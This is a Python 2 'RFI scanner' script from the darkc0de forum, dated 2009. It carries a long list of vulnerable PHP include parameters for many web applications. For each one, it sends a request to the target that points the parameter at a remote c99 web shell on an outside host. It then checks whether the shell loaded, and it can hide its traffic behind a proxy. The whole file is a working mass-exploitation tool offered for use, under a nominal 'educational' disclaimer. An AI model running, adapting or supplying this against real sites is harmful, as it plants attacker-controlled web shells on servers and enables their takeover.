#!/usr/bin/python
# This was written for educational purpose only. Use it at your own risk.
# Author will be not responsible for any damage!
# !!! Special greetz for my friend sinner_01 !!!
# !!! Special thanx for d3hydr8 and rsauron who inspired me !!! 
#
################################################################ 
#       .___             __          _______       .___        # 
#     __| _/____ _______|  | __ ____ \   _  \    __| _/____    # 
#    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \   # 
#   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   # 
#   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\   # 
#        \/                  \/             \/                 # 
#                   ___________   ______  _  __                # 
#                 _/ ___\_  __ \_/ __ \ \/ \/ /                # 
#                 \  \___|  | \/\  ___/\     /                 # 
#                  \___  >__|    \___  >\/\_/                  # 
#      est.2007        \/            \/   forum.darkc0de.com   # 
################################################################ 
# ---  d3hydr8 - rsauron - P47r1ck - r45c4l - C1c4Tr1Z - bennu # 
# ---  QKrun1x  - skillfaker - Croathack - Optyx - Nuclear     #
# ---  Eliminator and to all members of darkc0de and ljuska.org#                                                             #
################################################################ 


import sys, time, re, urllib2, httplib, socket, os

if sys.platform == 'linux' or sys.platform == 'linux2':
	clearing = 'clear'
else:
	clearing = 'cls'
os.system(clearing)

proxy = "None"
count = 0

if len(sys.argv) < 2 or len(sys.argv) > 4:
	print "\n|---------------------------------------------------------------|"
        print "| b4ltazar[@]gmail[dot]com                                      |"
        print "|   01/2009      RFI scanner v2.0                               |"
	print "| Help: rfiscan2.py -h                                          |"
	print "| Visit www.darkc0de.com and www.ljuska.org                     |"
        print "|---------------------------------------------------------------|\n"
	sys.exit(1)
	
for arg in sys.argv:
	if arg == '-h':
		print "\n|---------------------------------------------------------------|"
                print "| b4ltazar[@]gmail[dot]com                                      |"
                print "|   01/2009      RFI scanner v2.0                               |"
                print "| Usage: rfiscan2.py www.site.com                               |"
	        print "| Example: rfiscan2.py                                          |"
	        print "| Visit www.darkc0de.com and www.ljuska.org                     |"
                print "|---------------------------------------------------------------|\n"
		sys.exit(1)
	elif arg == '-p':
		proxy = sys.argv[count+1]
	count += 1
	
site = sys.argv[1]
shell = 'http://www.defcont4.hypersite.com.br/shell/c99.txt?'
if site[:4] != "http":
	site = "http://"+site
if site[-1] != "/":
	site = site+"/"
	
paths = ['index.php?fq=','includes/header.php?systempath=','Gallery/displayCategory.php?basepath=','index.inc.php?PATH_Includes=','nphp/nphpd.php?nphp_config[LangFile]=','include/db.php?GLOBALS[rootdp]=','kopshti/?f=','ashnews.php?pathtoashnews=','ashheadlines.php?pathtoashnews=','modules/xgallery/upgrade_album.php?GALLERY_BASEDIR=','demo/includes/init.php?user_inc=','jaf/index.php?show=','inc/shows.inc.php?cutepath=','poll/admin/common.inc.php?base_path=','pollvote/pollvote.php?pollname=','sources/post.php?fil_config=','modules/My_eGallery/public/displayCategory.php?basepath=','bb_lib/checkdb.inc.php?libpach=','include/livre_include.php?no_connectlol&chem_absolu=','index.php?from_marketY&pageurl=','modules/mod_mainmenu.php?mosConfig_absolute_path=','pivot/modules/module_db.php?pivot_path=','modules/nAlbum/public/displayCategory.php?basepath=','derniers_commentaires.php?rep=','index.php?z=','index.php?strana=','modules/coppermine/themes/default/theme.php?THEME_DIR=','modules/coppermine/include/init.inc.php?CPG_M_DIR=','modules/coppermine/themes/coppercop/theme.php?THEME_DIR=','coppermine/themes/maze/theme.php?THEME_DIR=','allmylinks/include/footer.inc.php?_AMLconfig[cfg_serverpath]=','allmylinks/include/info.inc.php?_AMVconfig[cfg_serverpath]=','myPHPCalendar/admin.php?cal_dir=','agendax/addevent.inc.php?agendax_path=','modules/mod_mainmenu.php?mosConfig_absolute_path=','modules/PNphpBB/includes/functions_admin.php?phpbb_root_path=','main.php?page=','default.php?page=','index.php?action=','index.php?p=','index.php?x=','index.php?content=','index.php?conteudo=','index.php?cat=','include/new-visitor.inc.php?lvc_include_dir=','modules/agendax/addevent.inc.php?agendax_path=','shoutbox/expanded.php?conf=','modules/xgallery/upgrade_album.php?GALLERY_BASEDIR=','pivot/modules/module_db.php?pivot_path=','library/editor/editor.php?root=','library/lib.php?root=','e/e_handlers/secure_img_render.php?p=','zentrack/index.php?configFile=','main.php?x=','becommunity/community/index.php?pageurl=','GradeMap/index.php?page=','phpopenchat/contrib/yabbse/poc.php?sourcedir=','calendar/calendar.php?serverPath=','calendar/functions/popup.php?serverPath=','calendar/events/header.inc.php?serverPath=','calendar/events/datePicker.php?serverPath=','calendar/setup/setupSQL.php?serverPath=','calendar/setup/header.inc.php?serverPath=','mwchat/libs/start_lobby.php?CONFIG[MWCHAT_Libs]=','zentrack/index.php?configFile=','pivot/modules/module_db.php?pivot_path=','inc/header.php/step_one.php?server_inc=','install/index.php?lng../../include/main.inc&G_PATH=','inc/pipe.php?HCL_path=','include/write.php?dir=','include/new-visitor.inc.php?lvc_include_dir=','includes/header.php?systempath=','support/mailling/maillist/inc/initdb.php?absolute_path=','coppercop/theme.php?THEME_DIR=','zentrack/index.php?configFile=','pivot/modules/module_db.php?pivot_path=','inc/header.php/step_one.php?server_inc=','install/index.php?lng../../include/main.inc&G_PATH=','inc/pipe.php?HCL_path=','include/write.php?dir=','include/new-visitor.inc.php?lvc_include_dir=','includes/header.php?systempath=','support/mailling/maillist/inc/initdb.php?absolute_path=','coppercop/theme.php?THEME_DIR=','becommunity/community/index.php?pageurl=','shoutbox/expanded.php?conf=','agendax/addevent.inc.php?agendax_path=','myPHPCalendar/admin.php?cal_dir=','yabbse/Sources/Packages.php?sourcedir=','dotproject/modules/projects/addedit.php?root_dir=','dotproject/modules/projects/view.php?root_dir=','dotproject/modules/projects/vw_files.php?root_dir=','dotproject/modules/tasks/addedit.php?root_dir=','dotproject/modules/tasks/viewgantt.php?root_dir=','My_eGallery/public/displayCategory.php?basepath=','modules/My_eGallery/public/displayCategory.php?basepath=','modules/nAlbum/public/displayCategory.php?basepath=','modules/coppermine/themes/default/theme.php?THEME_DIR=','modules/agendax/addevent.inc.php?agendax_path=','modules/xoopsgallery/upgrade_album.php?GALLERY_BASEDIR=','modules/xgallery/upgrade_album.php?GALLERY_BASEDIR=','modules/coppermine/include/init.inc.php?CPG_M_DIR=','modules/mod_mainmenu.php?mosConfig_absolute_path=','shoutbox/expanded.php?conf=','pivot/modules/module_db.php?pivot_path=','library/editor/editor.php?root=','library/lib.php?root=','e/e_handlers/secure_img_render.php?p=','main.php?x=','main.php?page=','index.php?meio.php=','index.php?include=','index.php?inc=','index.php?page=','index.php?pag=','index.php?p=','index.php?x=','index.php?open=','index.php?visualizar=','index.php?pagina=','index.php?content=','inc/step_one_tables.php?server_inc=','GradeMap/index.php?page=','phpshop/index.php?base_dir=','admin.php?cal_dir=','contacts.php?cal_dir=','convert-date.php?cal_dir=','album_portal.php?phpbb_root_path=','mainfile.php?MAIN_PATH=','dotproject/modules/files/index_table.php?root_dir=','html/affich.php?base=','gallery/init.php?HTTP_POST_VARS=','pm/lib.inc.php?pm_path=','ideabox/include.php?gorumDir=','index.php?includes_dir=','forums/toplist.php?phpbb_root_path=','forum/toplist.php?phpbb_root_path=','admin/config_settings.tpl.php?include_path=','include/common.php?include_path=','event/index.php?page=','forum/index.php?includeFooter=','forums/index.php?includeFooter=','forum/bb_admin.php?includeFooter=','forums/bb_admin.php?includeFooter=','language/lang_english/lang_activity.php?phpbb_root_path=','forum/language/lang_english/lang_activity.php?phpbb_root_path=','blend_data/blend_common.php?phpbb_root_path=','master.php?root_path=','includes/kb_constants.php?module_root_path=','forum/includes/kb_constants.php?module_root_path=','forums/includes/kb_constants.php?module_root_path=','classes/adodbt/sql.php?classes_dir=','agenda.php?rootagenda=','agenda.php?rootagenda=','sources/lostpw.php?CONFIG[path]=','topsites/sources/lostpw.php?CONFIG[path]=','toplist/sources/lostpw.php?CONFIG[path]=','sources/join.php?CONFIG[path]=','topsites/sources/join.php?CONFIG[path]=','toplist/sources/join.php?CONFIG[path]=','topsite/sources/join.php?CONFIG[path]=','public_includes/pub_popup/popup_finduser.php?vsDragonRootPath=','extras/poll/poll.php?file_newsportal=','index.php?site_path=','mail/index.php?site_path=','fclick/show.php?path=','show.php?path=','calogic/reconfig.php?GLOBALS[CLPath]=','eshow.php?Config_rootdir=','auction/auction_common.php?phpbb_root_path=','index.php?inc_dir=','calendar/index.php?inc_dir=','modules/TotalCalendar/index.php?inc_dir=','modules/calendar/index.php?inc_dir=','calendar/embed/day.php?path=','ACalendar/embed/day.php?path=','calendar/add_event.php?inc_dir=','claroline/auth/extauth/drivers/ldap.inc.php?clarolineRepositorySys=','claroline/auth/ldap/authldap.php?includePath=','docebo/modules/credits/help.php?lang=','modules/credits/help.php?lang=','config.php?returnpath=','editsite.php?returnpath=','in.php?returnpath=','addsite.php?returnpath=','includes/pafiledb_constants.php?module_root_path=','phpBB/includes/pafiledb_constants.php?module_root_path=','pafiledb/includes/pafiledb_constants.php?module_root_path=','auth/auth.php?phpbb_root_path=','auth/auth_phpbb/phpbb_root_path=','apc-aa/cron.php?GLOBALS[AA_INC_PATH]=','apc-aa/cached.php?GLOBALS[AA_INC_PATH]=','infusions/last_seen_users_panel/last_seen_users_panel.php?settings[locale]=','phpdig/includes/config.php?relative_script_path=','includes/phpdig/includes/config.php?relative_script_path=','includes/dbal.php?eqdkp_root_path=','eqdkp/includes/dbal.php?eqdkp_root_path=','dkp/includes/dbal.php?eqdkp_root_path=','include/SQuery/gameSpy.php?libpath=','include/global.php?GLOBALS[includeBit]=','topsites/config.php?returnpath=','manager/frontinc/prepend.php?_PX_config[manager_path]=','ubbthreads/addpost_newpoll.php?addpollthispath=','forum/addpost_newpoll.php?thispath=','forums/addpost_newpoll.php?thispath=','ubbthreads/ubbt.inc.php?thispath=','forums/ubbt.inc.php?thispath=','forum/ubbt.inc.php?thispath=','forum/admin/addentry.php?phpbb_root_path=','admin/addentry.php?phpbb_root_path=','index.php?f=','index.php?act=','ipchat.php?root_path=','includes/orderSuccess.inc.php?glob[rootDir]=','stats.php?dir[func]dir[base]=','ladder/stats.php?dir[base]=','ladders/stats.php?dir[base]=','sphider/admin/configset.php?settings_dir=','admin/configset.php?settings_dir=','vwar/admin/admin.php?vwar_root=','modules/vwar/admin/']
	
	
print "\n|---------------------------------------------------------------|"
print "| b4ltazar[@]gmail[dot]com                                      |"
print "|   01/2009      RFI scanner v2.0                               |"
print "| Visit www.darkc0de.com and www.ljuska.org                     |"
print "|---------------------------------------------------------------|\n"
print "\n[+] %s" % time.strftime("%X")
socket.setdefaulttimeout(20)
try:
	if proxy != "None":
		print "[+] Proxy:",proxy
		print "\n[+] Testing proxy..."
		pr = httplib.HTTPConnection(proxy)
		pr.connect()
		proxy_handler = urllib2.ProxyHandler({'http': 'http://'+proxy+'/'})
		proxyfier = urllib2.build_opener(proxy_handler)
		proxyfier.open("http://www.google.com")
		print
		print "\t[!] w00t!,w00t! Proxy: "+proxy+" Working"
		print
	else:
		print "[-] Proxy not given"
		print
		proxy_handler = ""
except(socket.timeout):
		print
		print "\t[-] Proxy Timed Out"
		print
		sys.exit(1)
except(),msg:
		print msg
		print "\t[-] Proxy Failed"
		print 
		sys.exit(1)
		

#try:
#	url = "http://antionline.com/tools-and-toys/ip-locate/index.php?address="
#except(IndexError):
#	print "[-] Wtf?"
#proxyfier = urllib2.build_opener(proxy_handler)
#proxy_check = proxyfier.open(url).readlines()
#for line in proxy_check:
#	if re.search("<br><br>",line):
#		line = line.replace("</b>","").replace('<br>',"").replace('<b>',"")
#		print "\n[!]",line,"\n"
		
print "\n[+] Target:",site
print "[+]",len(paths),"RFI paths loaded..."
print "[+] Starting Scan...\n"

for path in paths:
	proxyfier = urllib2.build_opener(proxy_handler)
	try:
		check = proxyfier.open(site+path.replace("\n", "")+shell).read()
		source = re.findall("c99shell",check)
		if len(source) > 0:
			
			print "[!] w00t!,w00t!: ",site+path+shell
			print
	except(urllib2.HTTPError):
			pass
	except(KeyboardInterrupt,SystemExit):
			pass
print "[+] Scanning finished"
print
print "\n[-] %s" % time.strftime("%X")

